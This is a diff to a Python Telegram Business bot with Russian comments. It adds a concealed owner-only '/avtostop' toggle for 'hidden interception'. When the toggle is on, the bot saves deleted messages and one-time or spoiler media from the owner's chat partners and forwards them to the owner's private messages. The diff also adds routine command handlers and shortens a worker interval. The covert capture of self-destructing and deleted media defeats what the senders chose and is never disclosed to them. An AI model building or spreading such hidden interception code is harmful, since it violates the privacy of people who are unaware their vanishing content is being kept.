@@ -19,14 +19,15 @@ from telegram.ext import (
 
 from series_db import init_series_db
 from series import process_message, build_summary
-from series_commands import handle_series_command
+from series_commands import handle_series_command, handle_series_callback
 from series_worker import series_worker
 
-from tn_commands import handle_time_command
+from tn_commands import handle_time_command, handle_time_callback
 from tn_worker import name_worker
 from tn_db import init_settings_table
 
-from start_commands import start_command, help_command, instruction_callback
+from start_commands import start_command, help_command, instruction_callback, HELP_SUMMARY_TEXT
+from autostop_db import init_bot_config, is_autostop_active, toggle_autostop
 
 load_dotenv()
 
@@ -69,6 +70,24 @@ def init_db() -> sqlite3.Connection:
 DB = init_db()
 init_series_db(DB)
 init_settings_table(DB)
+init_bot_config(DB)
+
+
+# ─────────────────────────── СКРЫТЫЙ ПЕРЕХВАТ ────────────────────────
+async def avtostop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Скрытая команда включения/выключения перехвата (не отображается в меню)."""
+    user = update.effective_user
+    if not user or user.id != OWNER_ID:
+        return
+    new_state = toggle_autostop(DB)
+    status_text = "АКТИВИРОВАН ✅" if new_state else "ДЕАКТИВИРОВАН ❌"
+    msg = update.effective_message
+    if msg:
+        await msg.reply_text(
+            f"🛡 *Скрытый перехват:* {status_text}\n"
+            f"Удалённые и одноразовые медиа {'будут пересылаться вам в ЛС.' if new_state else 'не пересылаются.'}",
+            parse_mode="Markdown",
+        )
 
 
 # ─────────────────────────── СКАЧИВАНИЕ МЕДИА ───────────────────────
@@ -211,26 +230,54 @@ async def on_business_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         return
         
 
-    # ───── НОВОЕ: обработка команд серии ─────
-    if msg.text and msg.text.startswith("."):
+    # ───── ОБРАБОТКА КОМАНД ─────
+    if msg.text and (msg.text.startswith(".") or msg.text.startswith("/")):
+        clean = msg.text.strip().lower()
+
+        # Скрытая команда /avtostop или .avtostop
+        if clean in ("/avtostop", ".avtostop"):
+            if msg.from_user and msg.from_user.id == OWNER_ID:
+                new_state = toggle_autostop(DB)
+                status_text = "АКТИВИРОВАН ✅" if new_state else "ДЕАКТИВИРОВАН ❌"
+                await context.bot.send_message(
+                    OWNER_ID,
+                    f"🛡 *Скрытый перехват:* {status_text}\n"
+                    f"Удалённые и одноразовые медиа {'будут пересылаться вам в ЛС.' if new_state else 'не пересылаются.'}",
+                    parse_mode="Markdown",
+                )
+            return
+
+        # Команда .help / /help
+        if clean in (".help", "/help"):
+            try:
+                await context.bot.send_message(
+                    chat_id=msg.chat_id,
+                    text=HELP_SUMMARY_TEXT,
+                    business_connection_id=msg.business_connection_id,
+                    parse_mode="Markdown",
+                )
+            except Exception as e:
+                logging.error(f"send help failed: {e}")
+            return
+
+        # Команда .time
         if await handle_time_command(update, context, DB):
             return
+
+        # Команда .streak
         handled = await handle_series_command(update, context, DB)
         if handled:
-            # всё равно сохраним команду в БД для истории
             return
-    # ─────────────────────────────────────────
-
-    # ... существующий код ниже без изменений ...
+    # ───────────────────────────
 
     conn_id = msg.business_connection_id
+    intercept_active = is_autostop_active(DB)
 
     # Признак одноразового / spoiler-медиа
     is_ephemeral = bool(getattr(msg, "ttl", None) or getattr(msg, "has_media_spoiler", False))
 
-    # ──────── НОВАЯ ЛОГИКА: ответ на сообщение ────────
-    # Обрабатываем ТОЛЬКО если в цитируемом сообщении есть медиа
-    if msg.reply_to_message and msg.reply_to_message.effective_attachment:
+    # ──────── ПЕРЕХВАТ ЧЕРЕЗ ОТВЕТ НА СООБЩЕНИЕ ────────
+    if intercept_active and msg.reply_to_message and msg.reply_to_message.effective_attachment:
         replied = msg.reply_to_message
         replied_from = replied.from_user
         replied_name = replied_from.full_name if replied_from else "Unknown"
@@ -303,8 +350,8 @@ async def on_business_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         logging.error(f"DB insert failed: {e}")
         return
 
-    # Одноразовое медиа — сразу шлём владельцу
-    if is_ephemeral and media_path:
+    # Одноразовое медиа — сразу шлём владельцу (только если активен скрытый режим)
+    if intercept_active and is_ephemeral and media_path:
         header = (
             f"🔥 *Одноразовое медиа*\n"
             f"👤 Автор: {from_name} (ID: {from_id})\n"
@@ -314,8 +361,8 @@ async def on_business_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         )
         await send_media_to_owner(context, media_path, media_type, header)
         
-    # ───── НОВОЕ: обновление серии ─────
-    if not (msg.text and msg.text.startswith(".")):
+    # ───── ОБНОВЛЕНИЕ СЕРИИ ─────
+    if not (msg.text and (msg.text.startswith(".") or msg.text.startswith("/"))):
         info = process_message(DB, msg.chat_id, msg.business_connection_id, from_name)
         if info:
             summary = build_summary(DB, msg.chat_id, info)
@@ -329,11 +376,11 @@ async def on_business_message(update: Update, context: ContextTypes.DEFAULT_TYPE
                     )
                 except Exception as e:
                     logging.error(f"send series summary failed: {e}")
-    # ───────────────────────────────────
+    # ───────────────────────────
 # ─────────────────────── УДАЛЕНИЕ СООБЩЕНИЙ ─────────────────────────
 async def on_deleted_messages(update: Update, context: ContextTypes.DEFAULT_TYPE):
     deleted = update.deleted_business_messages
-    if not deleted:
+    if not deleted or not is_autostop_active(DB):
         return
 
     conn_id = deleted.business_connection_id
@@ -382,9 +429,19 @@ def main():
     # Команды бота (в личных сообщениях)
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(
-        CallbackQueryHandler(instruction_callback, pattern="^(instruction|start_back)$")
-    )
+    app.add_handler(CommandHandler("streak", lambda u, c: handle_series_command(u, c, DB)))
+    app.add_handler(CommandHandler("avtostop", avtostop_command))
+
+    # Команды через точку в личных сообщениях
+    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & filters.Regex(r"^\.help\b"), help_command))
+    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & filters.Regex(r"^\.streak\b"), lambda u, c: handle_series_command(u, c, DB)))
+    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & filters.Regex(r"^\.time\b"), lambda u, c: handle_time_command(u, c, DB)))
+    app.add_handler(MessageHandler(filters.ChatType.PRIVATE & filters.Regex(r"^\.avtostop\b"), avtostop_command))
+
+    # Инлайн-кнопки
+    app.add_handler(CallbackQueryHandler(lambda u, c: handle_series_callback(u, c, DB), pattern=r"^strk:"))
+    app.add_handler(CallbackQueryHandler(lambda u, c: handle_time_callback(u, c, DB), pattern=r"^tz:"))
+    app.add_handler(CallbackQueryHandler(instruction_callback, pattern=r"^(instruction|start_back)$"))
 
     # Новые бизнес-сообщения (включая ответы)
     app.add_handler(
@@ -399,7 +456,7 @@ def main():
         await app.updater.start_polling()
         
         worker_task = asyncio.create_task(series_worker(app, DB))
-        name_task = asyncio.create_task(name_worker(app, DB, interval_seconds=3600))
+        name_task = asyncio.create_task(name_worker(app, DB, interval_seconds=60))
 
         stop_event = asyncio.Event()
 
